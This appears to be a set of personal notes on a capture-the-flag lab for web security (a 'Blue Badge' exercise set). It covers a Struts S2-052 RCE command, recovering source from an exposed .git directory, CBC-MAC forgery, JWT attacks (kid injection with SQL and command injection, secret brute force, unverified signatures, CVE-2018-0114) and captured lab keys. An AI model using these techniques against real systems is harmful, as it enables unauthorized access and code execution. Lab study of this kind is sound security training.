## Blue Badge

### Struts S2-052
XML deserialization to RCE

```
$ python3 s2-052.py --target http://ptl-cb6ff16c-87a44c51.libcurl.so/orders/3 --command "/usr/local/bin/score 2fdb31a2-ca58-4650-abfb-9406be061d69"
```

### Git Information Leak
Go to `/.git`

### Git Information Leak II
Exploring the `.git` directory

```
http://ptl-b59955a8-7868f360.libcurl.so/.git/HEAD
http://ptl-b59955a8-7868f360.libcurl.so/.git/refs/heads/master
http://ptl-b59955a8-7868f360.libcurl.so/.git/objects/cc/c6fa9250402cc9a7631fb0be559f00c5fd227a
$ printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" |cat - c6fa9250402cc9a7631fb0be559f00c5fd227a |gzip  -cd -q
http://ptl-b59955a8-7868f360.libcurl.so/.git/objects/58/ace0476093d04023f84d7816adacfa7b879c43
$ printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" |cat - ace0476093d04023f84d7816adacfa7b879c43 |gzip  -cd -q|strings -a|less
tree 182
40000 css
100644 favicon.ico
s100644 footer.php
3100644 header.php
100644 index.php
```

Read files through their hashes

```
Unfortunately, using strings does not give us the hash for each file. We can do is create our own local repo:

$ mkdir /tmp/hack
$ cd /tmp/hack
$ git init 
And copy our files in it:

$ mkdir -p .git/objects/58 .git/objects/bc
$ cp /tmp/ace0476093d04023f84d7816adacfa7b879c43 /tmp/hack/.git/objects/58/
$ cp /tmp/4f01bdd14060e4ac78b36972584909d287b6f1 /tmp/hack/.git/objects/bc/
Then we should be able to retrieve the list of hashes:

$ git cat-file -p 58ace0476093d04023f84d7816adacfa7b879c43
040000 tree b352dde43705f193d2c1d4e6f6a133321186869f    css
100644 blob f303c6a7797f5e7a0d5bd31d39a7149366bbf873    favicon.ico
100644 blob 5adab1a1c52dc009d4f26bbce30dacc4c93eea33    footer.php
100644 blob c3646db7f9c7e6f126c75900fdcce16d50e1da82    header.php
100644 blob 88beb94b5e1fc48e1625c89f892b04bffb58225c    index.php
Once you're there, you can keep downloading the files and copying them in the right spot to get access to the full code using git cat-file -p ....
```

Or you can use GitTools's gitdumper

```
$ ./gitdumper.sh http://ptl-b59955a8-7868f360.libcurl.so/.git/ out1
$ ./extractor.sh out1 out2
# key in header.php: 7a56a0cc-f042-4b43-97de-d4427197e8fa
```

### CBC MAC
- first get the signature for `administ` since block size is 8 bytes.
- then get the signature for `sign("administ") ^ "rator%00%00%00"`
- this signature will work for `administrator`

```
$ python3 cbc-mac.py
```

### CBC MAC II

- proper implementation of CBC-MAC uses a NULL IV.
- a string of block-size that only contains NULL bytes.
- in this application IV is random and given to user as a cookie.
- the trick from `CBC MAC 1` won't work since the IV changes each time you login.
- so the signature for `administ` will not be applicable next to for `rator%00%00%00`
- `administrator` can be written as `bdministrator`
- then xor the first character in both iv and auth.

```
$ python3 cbc-mac2.py
# 93fb87b6-11b4-485f-973e-91206b7234ba
```

### JWT III
- kid in jwt helps rotating keys, but the key retrieval might be compromised.
- the key retrieval is done prior to the signature verification.
- https://tools.ietf.org/html/rfc7515#section-4.1.4

```
$ python3 jwt-3.py #kid-injection
```

### JWT IV
- kid in jwt helps rotating keys, but the key retrieval might be compromised.
- the retrieval is done prior to the verfication of the signature therefore valid signature is not required.
- https://www.ruby-lang.org/en/news/2017/12/14/net-ftp-command-injection-cve-2017-17405/
    - ruby has two ways to open a file.
    - if it uses `Kernel.open` or `open` and the filename starts with a pipe (|) then the filename will be run as a command.

```
# set kid as the command you want to execute
$ python3 jwt-4.py
```

### JWT V
bruteforce the secret key

```
$ python3 jwt-5.py
```

### JWT VI
sql injection in jwt kid header

```
$ python3 jwt-6.py
# 6224a507-98fe-4d3f-805d-ae41ada4b4ae
# 3185a61d-1b90-4c24-8ce9-5e1ee6fbc5b8
```

### JWT VII
signature not verified

```
$ python3 jwt-7.py
# 62e50e5a-32f5-430d-aeda-ac2d30bab335
```

### CVE-2018-0114 (Cisco node-jose)

- This issue impacts version prior to 0.11.
- https://nvd.nist.gov/vuln/detail/CVE-2018-0114
- JWT allows users to embed public keys (using the `jwk` value) inside the header of the token.
- Some vulnerable libraries may trust the key you're providing even if the app doesn't use jwk.

doing some research

- https://tools.ietf.org/html/rfc7517#section-3
- https://connect2id.com/products/nimbus-jose-jwt/examples/jwk-generation#rsa
- https://jwcrypto.readthedocs.io/en/latest/jwk.html#examples

can't write my own exploit

```
$ python3 other.py
```



